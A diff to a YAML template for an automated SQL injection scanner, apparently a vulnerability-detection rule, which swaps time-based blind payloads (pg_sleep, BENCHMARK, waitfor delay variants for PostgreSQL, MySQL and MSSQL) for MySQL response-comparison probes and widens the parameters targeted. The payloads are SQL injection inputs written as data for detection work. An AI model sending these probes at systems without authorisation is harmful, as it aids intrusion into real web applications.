@@ -1,4 +1,5 @@
 bug-name: "SQL Injection"
+description: "detect Mysql SQLi based on the response body content"
 bug-type: "sqli"
 target-arguments:
   - type: "word"
@@ -30,47 +31,44 @@ target-arguments:
       - "string"
       - "number"
       - "filter"
+      - "v"
+      - "w"
+      - "q"
 
   - type: "regex"
     target: "name"
-    part: "query"
+    part: "all"
     regexes: 
       - "^.*(id|col|item|category|select|sort|row).*$"
-number-of-flow: 2
+number-of-flow: 3
 flows:
   match-condition: "all"
   flow_1:
     payloads:
-      - value: "'||(select 1 from pg_sleep(10))||'"
+      - value: "' '"
         position: "inject"
-        tag: "postgresql"
-      
-      - value: "'+BENCHMARK(70000000,SHA1(1337))+'"
-        position: "inject"
-        tag: "mysql, mariadb"
-      
-      - value: ";waitfor delay '0:0:10'--"
-        position: "append"
-        tag: "mssql"
-      
-      - value: ");waitfor delay '0:0:10'--"
-        position: "append"
-        tag: "mssql"
-      
-      - value: "';waitfor delay '0:0:10'--"
-        position: "append"
-        tag: "mssql"
-      
-      - value: "');waitfor delay '0:0:10'--"
-        position: "append"
-        tag: "mssql"
-      
-      - value: "));waitfor delay '0:0:10'--"
-        position: "append"
-        tag: "mssql"
+        tag: "mysql"
+
     endpoint: "{{base_url}}"
     verify:
-      - function: "is_delayed_for"
+      - function: "has_similar_content_wordlist"
         args:
-          duration: 10
+          body_content_1: "{{response_body_content!0}}"
+          body_content_2: "{{response_body_content!1}}"
+          rate: 93
         expected-value: True
+  
+  flow_2:
+    payloads:
+      - value: "'+'"
+        position: "inject"
+        tag: "mysql"
+
+    endpoint: "{{base_url}}"
+    verify:
+      - function: "has_similar_content_wordlist"
+        args:
+          body_content_1: "{{response_body_content!0}}"
+          body_content_2: "{{response_body_content!2}}"
+          rate: 93
+        expected-value: False
